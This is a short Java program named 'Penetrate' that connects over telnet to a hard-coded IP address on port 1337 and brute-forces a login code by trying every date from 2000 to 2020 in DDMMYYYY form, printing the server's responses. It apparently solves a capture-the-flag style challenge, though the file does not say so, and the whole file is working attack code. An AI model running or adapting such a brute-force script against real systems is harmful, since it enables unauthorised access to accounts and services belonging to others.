package telnet;
import org.apache.commons.net.telnet.TelnetClient;
import java.io.InputStream;
import java.io.PrintStream;

public class Penetrate {
    public static void  tryToLogin(String password) throws Exception{
        try {
            TelnetClient telnetClient = new TelnetClient();
            telnetClient.connect("20.77.41.13", 1337);
            // read stream
            InputStream inputStream = telnetClient.getInputStream();
            // print Stream
            PrintStream pStream = new PrintStream(telnetClient.getOutputStream());
            byte[] b = new byte[1024];
            int size;
            StringBuffer sBuffer = new StringBuffer(300);
            while (true) {
                size = inputStream.read(b);
                if (-1 != size) {
                    sBuffer.append(new String(b, 0, size));
                    // check if it is end
                    if (sBuffer.toString().trim().endsWith("code:")) {
                        break;
                    }
                }
            }
            System.out.println(sBuffer.toString()+password);
            // write you command
            pStream.println(password);
            // send it to server
            pStream.flush();

            sBuffer = new StringBuffer(300);
            while (true) {     //读取Server返回来的数据，直到读到登陆标识，这个时候认为可以输入用户名
                size = inputStream.read(b);
                if (-1 != size) {
                    sBuffer.append(new String(b, 0, size));
                    // receive your response
                    if (sBuffer.toString().trim().endsWith("connection...")) {
                        break;
                    }
                }
            }
            // print response
            System.out.println(sBuffer.toString());
            telnetClient.disconnect();
        }catch (Exception e){
            throw e;
        }
    }
    public static void main(String[] args) {
        int yyyy = 2000;
        int dd = 1;
        int mm = 1;
        System.out.println(String.format("%02d",10));
        for(Integer y=2000;y<2021;y++)
            for(Integer m=1;m<13;m++)
                for(Integer d=1;d<32;d++) {
                    String pass = String.format("%02d", d)
                            + String.format("%02d", m)
                            + y.toString();
                    try {
                        tryToLogin(pass);
                    } catch (Exception e) {
                        break;
                    }
                }
    }
}
